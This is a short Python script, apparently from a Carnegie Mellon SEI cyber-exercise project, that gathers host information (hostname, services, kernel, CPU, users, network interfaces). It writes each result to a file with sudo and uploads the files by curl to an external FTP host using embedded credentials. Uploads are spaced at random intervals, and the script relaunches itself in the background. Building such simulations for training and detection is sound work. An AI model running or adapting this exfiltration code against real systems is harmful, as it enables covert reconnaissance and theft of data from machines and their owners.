#!/usr/bin/python3

# Copyright 2023 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import sys, os, subprocess, time, random

def transfer():
    pwd = '#fpwd'
    cmds = ['hostname','service --status-all','uname -a','lscpu','finger','whoami','ip a']  # 'sudo iptables -L'
    filePath = "/home/user/Documents/"                   # can have this be multiple documents if that ends up being what i wanna do.
    out = dict()
    indexs = random.choices(['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','20','21','22','23','24','25','26','27','28','29','30'],k=len(cmds))
    for x in range(len(cmds)):
        out[x] = subprocess.run(f"{cmds[x]} | sudo tee {filePath}file{indexs[x]}",shell=True,capture_output=True).stdout.decode('utf-8')
        subprocess.run(f"curl -s -T {filePath}file{indexs[x]} ftp://will:{pwd}@ext",shell=True)   # might need something like -X PUT if not working
        time.sleep(random.randint(5,15))

if __name__=='__main__':
    tmpPath = os.path.abspath(sys.argv[0])
    index = tmpPath.rfind('/')
    dir = tmpPath[:index+1]
    fileName = tmpPath[index+1:].replace('.py','')
    cmd = f"python3 -c 'import sys;sys.path.insert(0,\"{dir}\"); import {fileName}; {fileName}.transfer()' &"
    subprocess.run(cmd,shell=True)#.stdout.decode('utf-8')
